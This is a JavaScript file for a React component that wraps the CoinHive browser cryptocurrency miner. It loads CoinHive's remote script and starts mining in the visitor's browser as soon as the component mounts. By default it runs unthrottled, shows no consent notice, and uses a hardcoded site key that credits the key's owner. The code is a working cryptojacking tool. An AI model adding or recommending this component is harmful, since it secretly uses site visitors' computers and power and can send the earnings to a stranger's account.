import React, { Component } from 'react'
import Idle from 'react-idle';
import loadScript from 'load-script';
import PropTypes from 'prop-types';

class CoinHiveClient extends Component {

  static defaultProps = {
    autoThreads: false,
    timeout: 30000,
    threads: 2,
    throttle: 0,
    siteKey: 'NjBUIBfgmgqwSRGjemP5JQCNFJu5UJTx',
    startOnIdle: false,
    onInit: (miner) => { },
    onStart: (miner) => { },
    onStop: (miner) => { }
  }

  constructor(props) {
    super(props);
    this.miner = null;
    this.idle = false;
  }

  start() {
    if (this.miner) {
      this.miner.start();
      this.props.onStart(this.miner);
    }
  }

  stop() {
    if (this.miner) {
      this.miner.stop();
      this.props.onStop(this.miner);
    }
  }

  buildMiner = async () => {
    if (this.miner && this.miner.isRunning()) {
      this.stop();
    }
    this.miner = await new Promise(resolve => {
      loadScript('https://coinhive.com/lib/coinhive.min.js', () => {
        if (this.props.userName) {
          return resolve(CoinHive.User(this.props.siteKey, this.props.userName));
        }
        return resolve(CoinHive.Anonymous(this.props.siteKey));
      })
    })
    this.handleProps(this.props);
  }

  async componentWillMount() {
    await this.buildMiner();
    this.props.onInit(this.miner);
    if (!this.idle) {
      this.start();
    }
  }

  async componentWillReceiveProps(nextProps) {
    this.handleProps(nextProps);
    this.stop();
    await this.buildMiner();
    if (!this.idle) {
      this.start();
    }
    return;
  }

  handleProps({ throttle, threads, autoThreads }) {
    if (this.miner != null) {
      this.miner.setThrottle(throttle);
      if (autoThreads) {
        this.miner.setAutoThreadsEnabled(autoThreads);
      } else {
        this.miner.setNumThreads(threads);
      }
    }
  }

  handleIdleChange = ({ idle }) => {
    if (this.miner != null) {
      if (idle) {
        this.start();
      } else {
        this.stop();
      }
    } else {
    }
    this.idle = idle;
  }


  render() {
    if (!this.props.startOnIdle) {
      return null;
    }
    return <Idle
      timeout={this.props.timeout}
      onChange={this.handleIdleChange}
    />
  }
}

CoinHiveClient.PropTypes = {
  siteKey: PropTypes.string.isRequired,
  timeout: PropTypes.number,
  onInit: PropTypes.func,
  onStart: PropTypes.func,
  onStop: PropTypes.func,
  userName: PropTypes.string,
  autoThreads: PropTypes.bool,
  startOnIdle: PropTypes.bool,
};

CoinHiveClient.displayMiner = miner => {
  if (!miner || typeof miner !== 'object' || typeof miner.isRunning !== 'function') {
    console.log('miner is not defined')
    return;
  }
  const data = {
    isRunning: miner.isRunning(),
    getHashesPerSecond: miner.getHashesPerSecond(),
    getNumThreads: miner.getNumThreads(),
    getAutoThreadsEnabled: miner.getAutoThreadsEnabled(),
    hasWASMSupport: miner.hasWASMSupport(),
    getThrottle: miner.getThrottle(),
    getToken: miner.getToken(),
    getTotalHashes: miner.getTotalHashes(),
    getAcceptedHashes: miner.getAcceptedHashes(),
  };
  console.log(data)
}

export default CoinHiveClient;
